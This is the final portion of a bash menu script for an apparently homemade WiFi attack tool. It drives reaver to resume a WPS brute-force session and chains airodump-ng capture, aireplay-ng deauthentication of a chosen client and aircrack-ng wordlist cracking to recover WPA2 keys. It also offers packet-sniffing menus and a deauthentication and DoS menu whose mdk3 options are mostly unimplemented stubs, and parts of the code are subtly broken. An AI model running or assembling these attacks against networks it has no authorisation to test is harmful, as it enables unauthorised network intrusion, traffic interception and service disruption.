wpacrack_continue() {
	pre_crack
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}######################CRACKING WPA/2 PROTECTED NETWORK######################${STD}"
	echo -e "${BANNER}################using reaver with a previously saved session################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${MESSAGE}[$]: BE SURE THAT YOU'VE ADDED THE TARGET INFORMATION FOR A WPA/2 AP"
	echo -e "${MESSAGE}[$]: NOW LAUNCHING REAVER TO CRACK WPA/2. THIS CAN TAKE FROM 4 TO 10 HOURS"
	echo -e "${CRITICAL}[!]: SIGNAL MUST BE STRONG FOR REAVER TO WORK PROPERLY!!!${STD}"	
	pause
	local SESSION
	echo -e "${CRITICAL}[?]: What is the name of your previously saved session (a {BUNCH OF NUMBERS HERE}.wpc file)?? ${BLK}"
	echo -e "${STD}"
	read SESSION
	case $SESSION in
		"") echo -e "${RED}[$]: ERROR, TRY AGAIN...${STD}" & sleep 2 & pause & wpacrack_continue ;;
		*) echo -e "${MESSAGE}[$]: ALRIGHT, CONTINUING PREVIOUS REAVER SESSION....${STD}" & sleep 3
	esac
	${S1}
	reaver -s ${SESSION}
	${S2}
	store_key
	pause
}
###########################################################################################
wpa_hash&smash() { #u need AP bssid, AP Essid, AP Ch, our MAC, our Interface, target station MAC
	pre_crack
	show_logo #BANNER: 
	echo -e "${BANNER}#############################################################################${STD}"
	echo -e "${BANNER}#####################CRACKING WPA2 PSK PROTECTED NETWORK#####################${STD}"
	echo -e "${BANNER}#######################using aircrack suite & wordlist#######################${STD}"
	echo -e "${BANNER}#############################################################################${STD}"
	echo -e "${MESSAGE}[$]: BE SURE THAT YOU'VE ADDED THE TARGET INFORMATION FOR A WPA2 PSK"
	echo -e "${MESSAGE}[$]: YOU NEED A DECENT WORDLIST FOR THIS TO WORK!"
	echo -e "${CRITICAL}[!]: THIS ATTACK IS BASICALLY BRUTEFORCE SO IT CAN TAKE LOTS AND LOTS OF TIME!${STD}"
	pause
	echo -e "${MESSAGE}[*] STEP 1 : START AIRODUMP IN NEW WINDOW${STD}"
	sleep 5
	${S1}
	${TERMINAL} -e "airodump-ng -c ${CHANNEL} -w ${FILE2} --bssid ${BSSID} ${INTERFACE}" & AIRODUMPPID=$!
	sleep 0.01
	${S2}
	echo -e "${MESSAGE}[*] STEP 2 : DEAUTH AP CLIENT STATION${STD}"
	local TARGET_MAC
	echo -e "${CRITICAL}[?]: SPECIFY CONNECTED STATION TO DEAUTH ${STD}" 
	read TARGET_MAC 
	echo ""
	sleep 5
	${S1}
	aireplay-ng -0 15 -a ${BSSID} -c ${TARGET_MAC} ${INTERFACE2}
	sleep 0.01
	${S2}
	local wordlist
	echo "" && echo "" echo ""
	echo -e "${CRITICAL}[?]: SPECIFY A WORDLIST LOCATION TO USE ${STD}" 
	read wordlist
	echo ""
	echo -e "${MESSAGE}[*] STEP 3 : RUN AIRCRACK WITH WORDLIST${STD}"	
	sleep 2
	${S1}
	aircrack-ng -e "${ESSID}" -w ${wordlist} ${FILE2}-01.cap
	sleep 0.01
	${S2}
	store_key
	echo -e "${INFO}[~]: killing processes...${STD}"
	${S1}
	kill ${AIRODUMPPID} & kill ${AIREPLAYPID}
	sleep 0.01
	${S2}
	echo -e "${INFO}[~]: killing processes...DONE!${STD}"	
	pause
}
###########################################################################################
store_key() {
	local CONFIRM
	echo -e "${CRITICAL}[!]: Would you like to write down your key [Y/n]? ${STD}"
	read CONFIRM
	case $CONFIRM in
		y|Y|YES|yes|Yes) echo -e "" &
		 echo -e "" & #BANNER: 
		 echo -e "${BANNER}############################################################################${STD}" &
		 echo -e "${BANNER}##############################SAVING WIFI KEY###############################${STD}" &
		 echo -e "${BANNER}############################################################################${STD}" &
		 echo -e "${CRITICAL}[?]: WHAT IS THE WIFI KEY?? ${STD}" & read KEY &
		 echo -e "${INFO}[~]: The key for the WIFI YOU CRACKED IS: ${KEY}${STD}" ;;
		*) echo -e "${RED}[$]: YOUR CHOICE, BACK TO MENU...${STD}" & sleep 5;;
	esac
}
###########################################################################################
aircrack() {
	pre_crack
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}###################USE PERSONNAL COMMANDS FOR AIRCRACK-NG###################${STD}"
	echo -e "${BANNER}###############################using aircrack###############################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	local COMMAND	
	echo -e "${CRITICAL}[?]: What command would you like to use in aircrack-ng?? ${BLK}"
	read COMMAND
	echo -e "${INFO}[~]: OPENING AIRCRACK-NG IN A NEW WINDOW${STD}"
	${TERMINAL} -e "aircrack-ng ${COMMAND}" & sleep 5 & pause & crack_menu
}
###########################################################################################
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! PACKET SNIFFING OPTIONS !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###########################################################################################
#==================================== OW LOOK A MENU =====================================#
sniff_menu() {
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}############################PACKET SNIFFING MENU############################${STD}"
	echo -e "${BANNER}#########################using tshark and wireshark#########################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~"	
	echo -e "  PACKET SNIFFING MENU"
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e "========================================================================"
	echo -e "YOUR PRIMARY INTERFACE IS : ${INTERFACE}   ;  YOUR MONITOR INTERFACE IS : ${INTERFACE2}"
	echo -e "SAVE FILENAME : ${FILE3} "
	echo -e "========================================================================"
	echo -e "   Have you changed your MAC yet? (STATUS: ${MACMODE})"
	echo -e "(m) *MENU* Visit Mac spoofing menu"
	echo -e "(~) *MENU* Visit Debugging menu"
	echo -e "(M) *MENU* Exit to main menu"
	echo -e "(E)        Exit WIFI-CRACKER"
	echo -e "-----------------------------------"
	echo -e "Please choose an option : "
	echo -e " 1.        Run tshark (on ${INTERFACE2})"
	echo -e " 2.        Run tshark and write to file"
	echo -e " 3.        Use tshark with any command"
	echo -e " 4.        Run wireshark (THE GREAT GUI VERSION OF TSHARK)"
	echo -e " 5.        Change you primary and monitoring interfaces' name"
	echo -e " 6.        Tell WIFI-CRACKER monitor mode status (STATUS: ${MONMODE})"
	echo -e " 7.        Turn ON monitor mode (STATUS: ${MONMODE})"
	echo -e " 8.        Turn OFF monitor mode (STATUS: ${MONMODE})"
	local choice
	read -p "Enter choice : " choice
	case $choice in
		1) pre_crack & ${S1} & tshark -i ${INTERFACE2} & ${S2} & pause ;;
		2) pre_crack & ${S1} & tshark -i ${INTERFACE2} -w ${FILE3} & ${S2} & pause ;;
		3) tshark_any ;;
		4) ${S1} & wireshark & disown & ${S2} & pause ;;
		5) ask_ifaces ;;
		6) change_mon ;;
		7) enable_mon ;;
		8) off_mon ;;
		"m") macspoof_info ;;
		"M") main_menu ;;
		"E") f_exit ;;
		"t") scout_menu ;;
		"c") crack_menu ;;
		"s") sniff_menu ;;
		"d") deauth_menu ;;
		"~") debug ;;
		hak5) hak5WS_menu ;;
		quit|qqq) exit 5 ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause
	esac
	sniff_menu
}
###########################################################################################
tshark_any() {
	pre_crack
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}#####################USE PERSONNAL COMMANDS FOR TSHARK######################${STD}"
	echo -e "${BANNER}################################using tshark################################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	local COMMAND	
	echo -e "${CRITICAL}[!]: What command would you like to use in tshark?? ${STD}" 
	read COMMAND
	echo -e "${INFO}[~]: OPENING TSHARK IN A NEW WINDOW${STD}"
	${TERMINAL} -e "tshark ${COMMAND}" & pause
}
###########################################################################################
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! DEAUTH OPTIONS !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###########################################################################################
#==================================== OW LOOK A MENU =====================================#
dauth_menu() {
	show_logo #BANNER: 
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"	
	echo -e "  DEATHENTICATION MENU [WIP]"
	echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo -e "========================================================================"
	echo -e "YOUR PRIMARY INTERFACE IS : ${INTERFACE}   ;  YOUR MONITOR INTERFACE IS : ${INTERFACE2}"
	echo -e "DROPRULES FILENAME : ${DROP}    ;   SSID LIST FILENAME : ${SSID}"
	echo -e "========================================================================"
	echo -e "   Have you changed your MAC yet? (STATUS: ${MACMODE})"
	echo -e "(m) *MENU* Visit Mac spoofing menu"
	echo -e "(~) *MENU* Visit Debugging menu"
	echo -e "(M) *MENU* Exit to main menu"
	echo -e "(E)        Exit WIFI-CRACKER"
	echo -e "-----------------------------------"
	echo -e "Please choose an option : "
	echo -e " 1.        Run mdk3 beacon flood"
	echo -e " 2.        Set SSID list or location (for beacon flood)"
	echo -e " 3.        Run mdk3 WPA bump down (will use Bssid value [${BSSID}] as target)"
	echo -e " 4.        Run mdk3 Auth DOS"
	echo -e	" 5.        Run mdk3 Death Amok"
	echo -e " 6.        Run mdk3 Michael shutdown (TKIP)"
	echo -e " 7.        Run mdk3 custom command"
	echo -e " 8.        Run airdrop-ng with droprules (needs running airodump)"
	echo -e " 9.        Set droprules or file location (write ## to stop)"
	echo -e "10.        Run aireplay -0 (DEAUTH)"
	echo -e "11.        Change you primary and monitoring interfaces' name"
	echo -e "12.        Tell WIFI-CRACKER monitor mode status (STATUS: ${MONMODE})"
	echo -e "13.        Turn ON monitor mode (STATUS: ${MONMODE})"
	echo -e "14.        Turn OFF monitor mode (STATUS: ${MONMODE})"
	local choice
	read -p "Enter choice : " choice
	case $choice in
		1) mdk3_bflood ;;
		2) mdk3_setssid ;;
		3) mdk3_wpa ;;
		4) mdk3_aDOS ;;
		5) mdk3_amok ;;
		6) mdk3_tkip ;;
		7) mdk3_any ;;
		8) airdrop ;;
		9) airdrop_setrules ;;
		10) aireplay ;;
		11) ask_ifaces ;;
		12) change_mon ;;
		13) enable_mon ;;
		14) off_mon ;;
		"m") macspoof_info ;;
		"M") main_menu ;;
		"E") f_exit ;;
		"t") scout_menu ;;
		"c") crack_menu ;;
		"s") sniff_menu ;;
		"d") deauth_menu ;;
		"~") debug ;;
		hak5) hak5WS_menu ;;
		quit|qqq) exit 5 ;;
		*) echo -e "${RED}Error...${STD}" & sleep 2 & pause
	esac
	deauth_menu
}
###########################################################################################
mdk3_any() {
	pre_crack
	show_logo #BANNER: 
	echo -e "${BANNER}############################################################################${STD}"
	echo -e "${BANNER}######################USE PERSONNAL COMMANDS FOR MDK########################${STD}"
	echo -e "${BANNER}################################ using mdk3 ################################${STD}"
	echo -e "${BANNER}############################################################################${STD}"
	local COMMAND	
	echo -e "${CRITICAL}[?]: What command would you like to use in mdk3? ${STD}" 
	read COMMAND
	echo -e "${CRITICAL}[!]: Specify the interface as well"
	echo -e "${INFO}[~]: OPENING mdk3 IN A NEW WINDOW${STD}"
	${TERMINAL} -e "mdk3 ${COMMAND}" & pause
}
###########################################################################################
mdk3_bflood() {
coming_soon
}
mdk3_setssid() {
coming_soon
}
###########################################################################################
mdk3_wpa() {
coming_soon
}
###########################################################################################
mdk3_aDOS() {
coming_soon
}
###########################################################################################
mdk3_amok() {
coming_soon
}
###########################################################################################
mdk3_tkip() {
coming_soon
}
###########################################################################################
###########################################################################################
airdrop() {
coming_soon
}
airdrop_setrules() {
coming_soon
}
###########################################################################################
###########################################################################################
aireplay() {
coming_soon
}
###########################################################################################
###########################################################################################


#+++++++++++++++++++++++++++++++++++++ MAIN FUNCTION +++++++++++++++++++++++++++++++++++++#
start_up
